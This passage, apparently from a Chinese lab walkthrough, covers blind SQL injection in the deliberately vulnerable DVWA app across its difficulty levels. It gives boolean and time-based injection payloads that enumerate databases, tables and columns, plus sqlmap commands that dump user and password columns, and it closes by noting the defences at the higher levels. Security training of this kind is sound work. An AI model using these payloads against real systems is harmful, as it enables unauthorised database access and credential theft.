<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1;#</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br></pre></td></tr></table></div></figure>

<p>依次尝试，发现输入到3时会报错，所以列数为2列</p>

        <h4 id="获取数据库名"   >
          <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
      
        <h5 id="获取数据库名称长度"   >
          <a href="#获取数据库名称长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;20;#</span><br></pre></td></tr></table></div></figure>

<p>返回不存在，说明数据库名称长度小于20</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220913553.png" alt="image-20240522091335512"></p>
<p>按二分法思维一直判断数据库名称长度，最后可以获取到长度为4</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220915719.png" alt="image-20240522091518676"></p>

        <h5 id="获取数据库名称"   >
          <a href="#获取数据库名称" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;65;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1"   >
          <a href="#substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1" class="headerlink" title="substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1"></a>substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1</h6>
      
        <h6 id="ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值"   >
          <a href="#ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值" class="heading-link"><i class="fas fa-link"></i></a><a href="#ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值" class="headerlink" title="ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值"></a>ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220918767.png" alt="image-20240522091832725"></p>
<p>所以第一个字符的ASCII码值大于65，再接着不断尝试，得到第一个字符的ASCII码值为100，即d，按此方法获取数据库第二个第三个第四个字符的ASCII码，最终得到数据库名称为dvwa</p>

        <h4 id="获取数据库表名-2"   >
          <a href="#获取数据库表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-2" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      
        <h5 id="获取表的数量"   >
          <a href="#获取表的数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database()) &lt;5;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="count-table-name-用于统计满足特定条件的行数（这里即表的数量）"   >
          <a href="#count-table-name-用于统计满足特定条件的行数（这里即表的数量）" class="heading-link"><i class="fas fa-link"></i></a><a href="#count-table-name-用于统计满足特定条件的行数（这里即表的数量）" class="headerlink" title="count(table_name) 用于统计满足特定条件的行数（这里即表的数量）"></a>count(table_name) 用于统计满足特定条件的行数（这里即表的数量）</h6>
      <p>返回存在，即表的数量少于5</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220929877.png" alt="image-20240522092952842"></p>
<p>不断尝试获取到表的数量为2</p>

        <h5 id="分别获取两个表的表名长度"   >
          <a href="#分别获取两个表的表名长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) &gt; 10;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名"   >
          <a href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名" class="headerlink" title="(select table_name from information_schema.tables where table_schema=database() limit 0,1) 用于从信息模式中选择第一个表名"></a>(select table_name from information_schema.tables where table_schema=database() limit 0,1) 用于从信息模式中选择第一个表名</h6>
      
        <h6 id="limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…"   >
          <a href="#limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…" class="heading-link"><i class="fas fa-link"></i></a><a href="#limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…" class="headerlink" title="limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果…."></a>limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果….</h6>
      <p>返回查找失败，说明第一个表名长度小于10</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220932207.png"></p>
<p>不断尝试获取到第一个表名长度为9，第二个表名长度为5</p>

        <h5 id="分别获取两个表的表名"   >
          <a href="#分别获取两个表的表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100;#</span><br></pre></td></tr></table></div></figure>

<p> 返回存在，说明第一个表的第一个字符的ASCII码值大于100</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220939543.png" alt="image-20240522093910508"></p>
<p>最终获得表名依次为guestbook，users</p>

        <h4 id="获取字段名"   >
          <a href="#获取字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4>
      
        <h5 id="获取users表中字段的数量"   >
          <a href="#获取users表中字段的数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;10;#</span><br></pre></td></tr></table></div></figure>

<p>返回不存在，说明字段数量小于10</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220953882.png" alt="image-20240522095302848"></p>
<p>尝试后获得字段数量为8</p>

        <h5 id="获取每个字段的字段长度"   >
          <a href="#获取每个字段的字段长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))&gt;10;#</span><br></pre></td></tr></table></div></figure>

<p>返回不存在，说明一个字段的字段长度小于10</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221001894.png" alt="image-20240522100158864"></p>
<p>最终获得每个字段的字段长度为7，10，9，4，8，6，10，12</p>

        <h5 id="获取字段名-1"   >
          <a href="#获取字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))&gt;100;#</span><br></pre></td></tr></table></div></figure>

<p>返回存在，所以第一个字段的ASCII码值大于100</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221010692.png" alt="image-20240522101036656"></p>
<p>继续尝试，得到字段名分别为user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>

        <h3 id="时间盲注"   >
          <a href="#时间盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>
      
        <h4 id="判断注入类型-2"   >
          <a href="#判断注入类型-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-2" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5);#</span><br></pre></td></tr></table></div></figure>

<p>有明细的延迟</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and sleep(5);#</span><br></pre></td></tr></table></div></figure>

<p>没有延迟，说明为字符型注入</p>

        <h4 id="获取数据库名-1"   >
          <a href="#获取数据库名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
      
        <h5 id="获取数据库名称长度-1"   >
          <a href="#获取数据库名称长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度-1" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>


        <h6 id="if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值"   >
          <a href="#if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值" class="heading-link"><i class="fas fa-link"></i></a><a href="#if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值" class="headerlink" title="if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值"></a>if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值</h6>
      <p>页面没有延迟，说明数据库名长度不为1</p>
<p>慢慢尝试，得到数据库名长度为4</p>

        <h5 id="获取数据库名称-1"   >
          <a href="#获取数据库名称-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称-1" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
      <p>判断第一个字符，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;90,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明数据库名第一个字符的ascii码值大于90</p>
<p>慢慢尝试得到数据库名为dvwa</p>

        <h4 id="获取数据库表名-3"   >
          <a href="#获取数据库表名-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-3" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      
        <h5 id="获取表的数量-1"   >
          <a href="#获取表的数量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量-1" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明表的数量为2</p>

        <h5 id="分别获取两个表的表名长度-1"   >
          <a href="#分别获取两个表的表名长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度-1" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
      <p>获取第一个表表名长度，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第一个表名长度为9</p>
<p>同理获取到第二个表表名长度为5</p>

        <h5 id="分别获取两个表的表名-1"   >
          <a href="#分别获取两个表的表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名-1" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
      <p>获取第一个表表名，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明表名的第一个字符的ASCII码值大于100</p>
<p>最后得到第一个表名为guestbook</p>
<p>获取第二个表表名，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第二个表表名的第一个字符的ASCII码值为117，即u</p>
<p>最后得到第二个表表名为users</p>

        <h4 id="获取字段名-2"   >
          <a href="#获取字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-2" class="headerlink" title="获取字段名"></a>获取字段名</h4>
      
        <h5 id="获取users表中字段的数量-1"   >
          <a href="#获取users表中字段的数量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量-1" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明users表中的字段数量为8</p>

        <h5 id="获取每个字段的字段长度-1"   >
          <a href="#获取每个字段的字段长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度-1" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=7,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第一个字段的长度为7</p>
<p>最终获得每个字段的字段长度为7，10，9，4，8，6，10，12</p>

        <h5 id="获取字段名-3"   >
          <a href="#获取字段名-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-3" class="headerlink" title="获取字段名"></a>获取字段名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=117,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第一个字段的第一个字符的ASCII码值为117，即u</p>
<p>继续尝试，得到字段名分别为user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>

        <h3 id="Sqlmap-1"   >
          <a href="#Sqlmap-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap-1" class="headerlink" title="Sqlmap"></a>Sqlmap</h3>
      <p>使用sqlmap进行注入</p>

        <h4 id="获得当前数据库名"   >
          <a href="#获得当前数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得当前数据库名" class="headerlink" title="获得当前数据库名"></a>获得当前数据库名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232157912.png" alt="image-20240523215729724"></p>

        <h4 id="获得表名"   >
          <a href="#获得表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得表名" class="headerlink" title="获得表名"></a>获得表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232208754.png" alt="image-20240523220802688"></p>

        <h4 id="获得表的字段名"   >
          <a href="#获得表的字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得表的字段名" class="headerlink" title="获得表的字段名"></a>获得表的字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232207992.png" alt="image-20240523220744925"></p>

        <h4 id="获取字段具体数据"   >
          <a href="#获取字段具体数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段具体数据" class="headerlink" title="获取字段具体数据"></a>获取字段具体数据</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241319693.png" alt="image-20240524131957645"></p>
<p>查看源代码，对输入没有任何限制</p>

        <h2 id="Medium-7"   >
          <a href="#Medium-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221337952.png" alt="image-20240522133710909"></p>
<p>和之前的注入一样，用HackBar用POST方式传入</p>

        <h3 id="布尔盲注-1"   >
          <a href="#布尔盲注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3>
      
        <h4 id="判断注入类型-3"   >
          <a href="#判断注入类型-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-3" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入1，页面返回存在这个ID</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320595.png" alt="image-20240522132028528"></p>
<p>输入1’or ‘1’=’1，报错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320302.png" alt="image-20240522132059254"></p>
<p>输入1 or 1 = 1，返回存在ID，说明是数字型注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221321139.png" alt="image-20240522132120100"></p>

        <h4 id="查看列数-3"   >
          <a href="#查看列数-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-3" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入1 order by 1，从1一直试直到报错，即可获得字段数，直到3报错，所以列数为2</p>

        <h4 id="获取数据库名-2"   >
          <a href="#获取数据库名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
      
        <h5 id="获取数据库名称长度-2"   >
          <a href="#获取数据库名称长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度-2" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and length(database())=4;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取数据库名称-2"   >
          <a href="#获取数据库名称-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称-2" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))&gt;65;#</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-4"   >
          <a href="#获取数据库表名-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-4" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      
        <h5 id="获取表的数量-2"   >
          <a href="#获取表的数量-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量-2" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(table_name) from information_schema.tables where table_schema=database()) =2;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="分别获取两个表的表名长度-2"   >
          <a href="#分别获取两个表的表名长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度-2" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个表</span><br><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9;#</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第二个表</span><br><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=5;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="分别获取两个表的表名-2"   >
          <a href="#分别获取两个表的表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名-2" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取第一个表的第一个字符</span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;#</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取第二个表的第一个字符</span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117;#</span><br></pre></td></tr></table></div></figure>

<p>最终获得表名依次为guestbook，users</p>

        <h4 id="获取字段名-4"   >
          <a href="#获取字段名-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-4" class="headerlink" title="获取字段名"></a>获取字段名</h4>
      
        <h5 id="获取users表中字段的数量-2"   >
          <a href="#获取users表中字段的数量-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量-2" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=8;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取每个字段的字段长度-2"   >
          <a href="#获取每个字段的字段长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度-2" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个字段长度</span><br><span class="line">1 and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),1))=7;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取字段名-5"   >
          <a href="#获取字段名-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-5" class="headerlink" title="获取字段名"></a>获取字段名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个字段第一个字符</span><br><span class="line">1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),1))=117;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="时间盲注-1"   >
          <a href="#时间盲注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3>
      <p>同Low难度步骤</p>
<p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221339914.png" alt="image-20240522133946866"></p>
<p>使用<code>mysqli_real_escape_string</code> 函数，通过对字符串中的特定字符进行转义处理，在特定字符前添加反斜线 <code>\</code> ，特定字符包括’、”、\、NUL 字符、\n、\r、\x1A(在 Windows 系统中，Control-Z (<code>\x1A</code>) 被解释为文件结束标记)</p>

        <h2 id="High-7"   >
          <a href="#High-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-7" class="headerlink" title="High"></a>High</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340011.png" alt="image-20240522134027966"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340132.png" alt="image-20240522134042088"></p>
<p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221347858.png" alt="image-20240522134746813"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221348596.png" alt="image-20240522134800557"></p>
<p>利用cookie传递参数id</p>
<p>添加了LIMIT 1，以此控制只输出一个结果</p>
<p>当SQL查询结果为空时，会执行函数sleep()，防止基于时间的盲注</p>
<p>所以只能布尔盲注了，步骤同Low</p>

        <h2 id="Impossible-7"   >
          <a href="#Impossible-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221351986.png" alt="image-20240522135112922"></p>
<p>和上面的一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入</p>

        <h6 id="SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html"   >
